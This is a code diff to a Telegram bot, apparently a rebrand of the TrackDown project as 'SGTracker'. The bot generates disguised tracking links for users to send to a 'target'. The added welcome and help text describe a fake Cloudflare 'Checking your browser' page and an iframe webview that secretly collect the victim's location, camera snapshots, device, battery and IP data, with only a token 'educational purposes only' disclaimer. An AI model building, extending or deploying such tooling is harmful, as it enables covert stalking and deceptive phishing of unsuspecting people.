@@ -19,7 +19,7 @@ app.use(cors());
 
 // Global variables
 const bot = new TelegramBot(process.env.bot);
-const hostURL = "https://sg-modder-offcial.vercel.app"; // अपना Vercel URL यहां पेस्ट करें
+const hostURL = "https://YOUR-VERCEL-URL-HERE.vercel.app"; // अपना Vercel URL यहां पेस्ट करें
 const use1pt = false;
 
 // Get the template paths
@@ -159,13 +159,51 @@ async function createLink(cid, msg) {
     var url = cid.toString(36) + '/' + Buffer.from(msg).toString('base64');
     var m = {
       reply_markup: JSON.stringify({
-        "inline_keyboard": [[{ text: "Create new Link", callback_data: "crenew" }]]
+        "inline_keyboard": [
+          [{ text: "🔄 Create New Link", callback_data: "crenew" }]
+        ]
       })
     };
 
     var cUrl = `${hostURL}/c/${url}`;
     var wUrl = `${hostURL}/w/${url}`;
 
+    // Create loading animation frames
+    const loadingFrames = [
+      "⬜⬜⬜⬜⬜",
+      "⬛⬜⬜⬜⬜",
+      "⬛⬛⬜⬜⬜",
+      "⬛⬛⬛⬜⬜",
+      "⬛⬛⬛⬛⬜",
+      "⬛⬛⬛⬛⬛"
+    ];
+    
+    // Send a processing message with initial animation frame
+    const processingMsgId = await bot.sendMessage(
+      cid, 
+      `<b>🔮 Generating your tracking links...</b>\n${loadingFrames[0]}\n<i>Please wait while we prepare everything for you...</i>`, 
+      { parse_mode: "HTML" }
+    ).then(msg => msg.message_id);
+    
+    // Start the loading animation
+    let currentFrame = 0;
+    const animationInterval = setInterval(async () => {
+      currentFrame = (currentFrame + 1) % loadingFrames.length;
+      try {
+        await bot.editMessageText(
+          `<b>🔮 Generating your tracking links...</b>\n${loadingFrames[currentFrame]}\n<i>Please wait while we prepare everything for you...</i>`,
+          {
+            chat_id: cid,
+            message_id: processingMsgId,
+            parse_mode: "HTML"
+          }
+        );
+      } catch (error) {
+        console.log("Animation update error:", error);
+      }
+    }, 500);
+    
+    // Show typing indicator for better UX
     await bot.sendChatAction(cid, "typing");
     
     try {
@@ -175,57 +213,154 @@ async function createLink(cid, msg) {
       // Then shorten the WebView link with multiple services
       const shortenedWUrls = await shortenUrl(wUrl);
       
+      // Stop the animation
+      clearInterval(animationInterval);
+      
+      // Show typing indicator again
+      await bot.sendChatAction(cid, "typing");
+      
       if (shortenedCUrls.length > 0 || shortenedWUrls.length > 0) {
-        let message = `New links have been created successfully.\nOriginal URL: ${msg}\n\n✅Your Links\n\n`;
+        let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
+        message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
+        message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
+        message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
         
-        // Add CloudFlare links with the format shown in screenshot
-        message += `🌐 CloudFlare Page Link\n`;
-        message += `Original: <a href="${cUrl}">click here</a>\n`;
+        // Add CloudFlare links with better formatting and visuals
+        message += `<b>🛡️ CLOUDFLARE PAGE LINK</b>\n`;
+        message += `<i>Shows a Cloudflare security check page before redirecting</i>\n\n`;
+        message += `🔗 <a href="${cUrl}">Click to open</a>\n\n`;
         
-        // Only add shorteners that worked - using symbols instead of names
-        shortenedCUrls.forEach((shortened, index) => {
-          let symbol = '';
-          if (shortened.name === 'XCut') symbol = '⚡';
-          else if (shortened.name === 'TinyURL') symbol = '🔗';
-          else if (shortened.name === 'Is.gd') symbol = '🌟';
-          else if (shortened.name === 'Cleanuri') symbol = '💫';
-          else symbol = '🔗';
-          
-          message += `${symbol} <a href="${shortened.url}">${shortened.url}</a>\n`;
+        // Only add shorteners that worked - using only symbols, no service names
+        if (shortenedCUrls.length > 0) {
+          message += `<b>📎 Shortened URLs:</b>\n`;
+          shortenedCUrls.forEach((shortened, index) => {
+            let symbol = '';
+            if (shortened.name === 'XCut') symbol = '⚡';
+            else if (shortened.name === 'TinyURL') symbol = '🔗';
+            else if (shortened.name === 'Is.gd') symbol = '🌟';
+            else if (shortened.name === 'Cleanuri') symbol = '💫';
+            else symbol = '🔗';
+            
+            message += `${symbol} <a href="${shortened.url}">${shortened.url}</a>\n`;
+          });
+        }
+        
+        message += `\n<b>🌐 WEBVIEW PAGE LINK</b>\n`;
+        message += `<i>Shows the target website in an iframe</i>\n\n`;
+        message += `🔗 <a href="${wUrl}">Click to open</a>\n\n`;
+        
+        // Only add shorteners that worked - using only symbols, no service names
+        if (shortenedWUrls.length > 0) {
+          message += `<b>📎 Shortened URLs:</b>\n`;
+          shortenedWUrls.forEach((shortened, index) => {
+            let symbol = '';
+            if (shortened.name === 'XCut') symbol = '⚡';
+            else if (shortened.name === 'TinyURL') symbol = '🔗';
+            else if (shortened.name === 'Is.gd') symbol = '🌟';
+            else if (shortened.name === 'Cleanuri') symbol = '💫';
+            else symbol = '🔗';
+            
+            message += `${symbol} <a href="${shortened.url}">${shortened.url}</a>\n`;
+          });
+        }
+        
+        message += `\n<b>⚠️ Remember:</b> <i>These links will collect victim's data when opened.</i>`;
+        
+        // Edit the loading message instead of sending a new one
+        await bot.editMessageText(message, {
+          chat_id: cid,
+          message_id: processingMsgId,
+          parse_mode: "HTML",
+          reply_markup: m.reply_markup
         });
+      } else {
+        // If all URL shorteners fail, edit the loading message with direct links
+        let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
+        message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
+        message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
+        message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
         
-        message += `\n🌐 WebView Page Link\n`;
-        message += `Original: <a href="${wUrl}">click here</a>\n`;
+        message += `<b>🛡️ CLOUDFLARE PAGE LINK</b>\n`;
+        message += `<i>Shows a Cloudflare security check page</i>\n`;
+        message += `<a href="${cUrl}">${cUrl}</a>\n\n`;
         
-        // Only add shorteners that worked - using symbols instead of names
-        shortenedWUrls.forEach((shortened, index) => {
-          let symbol = '';
-          if (shortened.name === 'XCut') symbol = '⚡';
-          else if (shortened.name === 'TinyURL') symbol = '🔗';
-          else if (shortened.name === 'Is.gd') symbol = '🌟';
-          else if (shortened.name === 'Cleanuri') symbol = '💫';
-          else symbol = '🔗';
-          
-          message += `${symbol} <a href="${shortened.url}">${shortened.url}</a>\n`;
+        message += `<b>🌐 WEBVIEW PAGE LINK</b>\n`;
+        message += `<i>Shows the target website in an iframe</i>\n`;
+        message += `<a href="${wUrl}">${wUrl}</a>\n\n`;
+        
+        message += `<b>⚠️ Remember:</b> <i>These links will collect victim's data when opened.</i>`;
+        
+        // Edit the loading message instead of sending a new one
+        await bot.editMessageText(message, {
+          chat_id: cid,
+          message_id: processingMsgId,
+          parse_mode: "HTML",
+          reply_markup: m.reply_markup
         });
+      }
+    } catch (error) {
+      console.error("Error shortening URLs:", error);
+      
+      // Stop the animation if it's still running
+      try {
+        clearInterval(animationInterval);
+      } catch (e) {
+        console.log("Error clearing animation interval:", e);
+      }
+      
+      // If error occurs, edit the loading message with direct links
+      try {
+        let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
+        message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
+        message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
+        message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
+        
+        message += `<b>🛡️ CLOUDFLARE PAGE LINK</b>\n`;
+        message += `<i>Shows a Cloudflare security check page</i>\n`;
+        message += `<a href="${cUrl}">${cUrl}</a>\n\n`;
+        
+        message += `<b>🌐 WEBVIEW PAGE LINK</b>\n`;
+        message += `<i>Shows the target website in an iframe</i>\n`;
+        message += `<a href="${wUrl}">${wUrl}</a>\n\n`;
+        
+        message += `<b>⚠️ Remember:</b> <i>These links will collect victim's data when opened.</i>`;
+        
+        // Edit the loading message instead of sending a new one
+        await bot.editMessageText(message, {
+          chat_id: cid,
+          message_id: processingMsgId,
+          parse_mode: "HTML",
+          reply_markup: m.reply_markup
+        });
+      } catch (e) {
+        console.log("Error editing message, sending a new one:", e);
+        
+        // Fallback to sending a new message if editing fails
+        let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
+        message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
+        message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
+        message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
+        
+        message += `<b>🛡️ CLOUDFLARE PAGE LINK</b>\n`;
+        message += `<i>Shows a Cloudflare security check page</i>\n`;
+        message += `<a href="${cUrl}">${cUrl}</a>\n\n`;
+        
+        message += `<b>🌐 WEBVIEW PAGE LINK</b>\n`;
+        message += `<i>Shows the target website in an iframe</i>\n`;
+        message += `<a href="${wUrl}">${wUrl}</a>\n\n`;
+        
+        message += `<b>⚠️ Remember:</b> <i>These links will collect victim's data when opened.</i>`;
         
         await bot.sendMessage(cid, message, { 
           reply_markup: m.reply_markup,
           parse_mode: "HTML"
         });
-      } else {
-        // If all URL shorteners fail, send direct links
-        await bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
       }
-    } catch (error) {
-      console.error("Error shortening URLs:", error);
-      // If error occurs, send direct links
-      await bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
     }
     
     return true;
   } else {
-    await bot.sendMessage(cid, `⚠️ Please Enter a valid URL , including http or https.`);
+    await bot.sendMessage(cid, `<b>⚠️ ERROR!</b>\n\nPlease enter a valid URL including http or https.`, { parse_mode: "HTML" });
     await createNew(cid);
     return false;
   }
@@ -395,6 +530,12 @@ app.post("/webhook", async (req, res) => {
       
       if (callbackQuery.data === "crenew") {
         await createNew(callbackQuery.message.chat.id);
+      } else if (callbackQuery.data === "help") {
+        // Show help message when the help button is clicked - edit the current message
+        await sendHelpMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
+      } else if (callbackQuery.data === "back_to_main") {
+        // Go back to main menu
+        await sendWelcomeMessage(callbackQuery.message.chat.id, callbackQuery.message.chat.first_name, callbackQuery.message.message_id);
       }
       
       return res.status(200).send("OK");
@@ -413,17 +554,7 @@ app.post("/webhook", async (req, res) => {
       
       // Handle /start command
       if (msg.text === "/start") {
-        var m = {
-          reply_markup: JSON.stringify({
-            "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]]
-          })
-        };
-        
-        await bot.sendMessage(
-          chatId, 
-          `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`, 
-          m
-        );
+        await sendWelcomeMessage(chatId, msg.chat.first_name);
       }
       // Handle /create command
       else if (msg.text === "/create") {
@@ -431,18 +562,7 @@ app.post("/webhook", async (req, res) => {
       }
       // Handle /help command
       else if (msg.text === "/help") {
-        await bot.sendMessage(
-          chatId,
-          ` Through this bot you can track people just by sending a simple link.\n\nSend /create
-to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
-the url it will send you 2 links which you can use to track people.
-\n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
-\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
-( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
-`
-        );
+        await sendHelpMessage(chatId);
       }
     }
     
@@ -453,15 +573,193 @@ the url it will send you 2 links which you can use to track people.
   }
 });
 
+// Helper function to send welcome message
+async function sendWelcomeMessage(chatId, firstName, messageId = null) {
+  // Create welcome message keyboard with emojis
+  const welcomeKeyboard = {
+    reply_markup: JSON.stringify({
+      "inline_keyboard": [
+        [
+          { text: "🔗 Create Tracking Link", callback_data: "crenew" }
+        ],
+        [
+          { text: "ℹ️ Help", callback_data: "help" }
+        ]
+      ]
+    })
+  };
+  
+  // Welcome message text
+  const welcomeText = 
+    `<b>🌟 Welcome ${firstName}! 🌟</b>\n\n` +
+    `<i>SGTracker</i> is your powerful tracking tool that creates custom links to gather information about anyone who clicks them.\n\n` +
+    `<b>📱 What You Can Track:</b>\n` +
+    `• 📍 Precise Location\n` +
+    `• 📷 Camera Snapshots\n` +
+    `• 💻 Device Information\n` +
+    `• 🔋 Battery Status\n` +
+    `• 🌐 Network Details\n\n` +
+    `<b>🚀 Get Started:</b> Click the button below or type /create to generate your first tracking link!\n\n` +
+    `<b>👨‍💻 Created by:</b> @SG_Modder\n` +
+    `<b>📢 Channels:</b> @sgmoddernew | @SG_Modder0 | @SG_Modder1`;
+  
+  // If editing an existing message
+  if (messageId) {
+    try {
+      await bot.editMessageText(welcomeText, {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: "HTML",
+        reply_markup: welcomeKeyboard.reply_markup
+      });
+    } catch (error) {
+      console.log("Error editing welcome message:", error);
+      // Fallback to sending a new message
+      await sendFullWelcomeMessage(chatId, firstName);
+    }
+  } else {
+    // If sending a new message with sticker
+    await sendFullWelcomeMessage(chatId, firstName);
+  }
+}
+
+// Helper function to send full welcome message with properly formatted content
+async function sendFullWelcomeMessage(chatId, firstName) {
+  // Show typing indicator for a more interactive feel
+  await bot.sendChatAction(chatId, "typing");
+  
+  // Create an enhanced keyboard with emojis
+  const welcomeKeyboard = {
+    reply_markup: JSON.stringify({
+      "inline_keyboard": [
+        [
+          { text: "🔗 Create Tracking Link", callback_data: "crenew" }
+        ],
+        [
+          { text: "ℹ️ Help", callback_data: "help" }
+        ]
+      ]
+    })
+  };
+  
+  // Send a visually enhanced welcome message (only one message)
+  await bot.sendMessage(
+    chatId, 
+    `<b>🌟 Welcome ${firstName}! 🌟</b>\n\n` +
+    `<i>SGTracker</i> is your powerful tracking tool that creates custom links to gather information about anyone who clicks them.\n\n` +
+    `<b>📱 What You Can Track:</b>\n` +
+    `• 📍 Precise Location\n` +
+    `• 📷 Camera Snapshots\n` +
+    `• 💻 Device Information\n` +
+    `• 🔋 Battery Status\n` +
+    `• 🌐 Network Details\n\n` +
+    `<b>🚀 Get Started:</b> Click the button below or type /create to generate your first tracking link!\n\n` +
+    `<b>👨‍💻 Created by:</b> @SG_Modder\n` +
+    `<b>📢 Channels:</b> @sgmoddernew | @SG_Modder0 | @SG_Modder1`, 
+    { 
+      parse_mode: "HTML",
+      reply_markup: welcomeKeyboard.reply_markup
+    }
+  );
+}
+
+// Helper function to send help message
+async function sendHelpMessage(chatId, messageId = null) {
+  // Show typing indicator
+  await bot.sendChatAction(chatId, "typing");
+  
+  // Create keyboard with useful links/actions and back button
+  const helpKeyboard = {
+    reply_markup: JSON.stringify({
+      "inline_keyboard": [
+        [
+          { text: "🔗 Create Tracking Link", callback_data: "crenew" }
+        ],
+        [
+          { text: "🔙 Back to Main Menu", callback_data: "back_to_main" }
+        ]
+      ]
+    })
+  };
+  
+  const helpText = 
+    `<b>📚 SGTRACKER HELP GUIDE 📚</b>\n\n` +
+    `<i>This bot creates tracking links that collect information about anyone who clicks them.</i>\n\n` +
+    
+    `<b>🚀 Getting Started:</b>\n` +
+    `1️⃣ Type /create or click the button below\n` +
+    `2️⃣ Enter a URL when prompted (e.g., https://google.com)\n` +
+    `3️⃣ The bot will generate your tracking links\n` +
+    `4️⃣ Share these links with your target\n` +
+    `5️⃣ When they open the link, you'll receive their information\n\n` +
+    
+    `<b>🔮 Available Link Types:</b>\n\n` +
+    `<b>1. 🛡️ Cloudflare Page:</b>\n` +
+    `• Shows a fake "Checking your browser" security page\n` +
+    `• Collects data while displaying the security check\n` +
+    `• Redirects to your target URL afterward\n` +
+    `• More convincing for security-conscious users\n\n` +
+    
+    `<b>2. 🌐 Webview Page:</b>\n` +
+    `• Shows your target URL in an iframe immediately\n` +
+    `• Collects data in the background\n` +
+    `• Note: Some sites block iframe embedding (e.g., Google)\n\n` +
+    
+    `<b>📱 Information Collected:</b>\n` +
+    `• 📍 Location (requires permission)\n` +
+    `• 📷 Camera snapshots (requires permission)\n` +
+    `• 🖥️ Device & browser details\n` +
+    `• 🔋 Battery information\n` +
+    `• 🌐 IP address & network data\n\n` +
+    
+    `<b>⚠️ DISCLAIMER:</b> <i>Use responsibly and only with proper consent. This tool is for educational purposes only.</i>\n\n` +
+    
+    `<b>👨‍💻 Created by:</b> @SG_Modder\n` +
+    `<b>📢 Channels:</b> @sgmoddernew | @SG_Modder0 | @SG_Modder1\n` +
+    `<b>🌐 GitHub:</b> <a href="https://github.com/SGModder-Offcial">SGModder-Offcial</a>`;
+  
+  // If messageId is provided, edit the message instead of sending a new one
+  if (messageId) {
+    try {
+      await bot.editMessageText(helpText, {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: "HTML",
+        reply_markup: helpKeyboard.reply_markup
+      });
+    } catch (error) {
+      console.log("Error editing message:", error);
+      // Fallback to sending a new message if editing fails
+      await bot.sendMessage(chatId, helpText, { 
+        parse_mode: "HTML",
+        reply_markup: helpKeyboard.reply_markup 
+      });
+    }
+  } else {
+    // Send a new message
+    await bot.sendMessage(chatId, helpText, { 
+      parse_mode: "HTML",
+      reply_markup: helpKeyboard.reply_markup 
+    });
+  }
+}
+
 // For local development
 if (process.env.NODE_ENV !== "production") {
   // Start polling for local testing
   console.log("Starting polling for local development...");
+  
   bot.on('callback_query', async (callbackQuery) => {
     await bot.answerCallbackQuery(callbackQuery.id);
     
     if (callbackQuery.data === "crenew") {
       await createNew(callbackQuery.message.chat.id);
+    } else if (callbackQuery.data === "help") {
+      // Show help message when the help button is clicked - edit the current message
+      await sendHelpMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
+    } else if (callbackQuery.data === "back_to_main") {
+      // Go back to main menu
+      await sendWelcomeMessage(callbackQuery.message.chat.id, callbackQuery.message.chat.first_name, callbackQuery.message.message_id);
     }
   });
   
@@ -476,17 +774,7 @@ if (process.env.NODE_ENV !== "production") {
     
     // Handle /start command
     if (msg.text === "/start") {
-      var m = {
-        reply_markup: JSON.stringify({
-          "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]]
-        })
-      };
-      
-      await bot.sendMessage(
-        chatId, 
-        `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`, 
-        m
-      );
+      await sendWelcomeMessage(chatId, msg.chat.first_name);
     }
     // Handle /create command
     else if (msg.text === "/create") {
@@ -494,18 +782,7 @@ if (process.env.NODE_ENV !== "production") {
     }
     // Handle /help command
     else if (msg.text === "/help") {
-      await bot.sendMessage(
-        chatId,
-        ` Through this bot you can track people just by sending a simple link.\n\nSend /create
-to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
-the url it will send you 2 links which you can use to track people.
-\n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
-\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
-( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
-`
-      );
+      await sendHelpMessage(chatId);
     }
   });
   
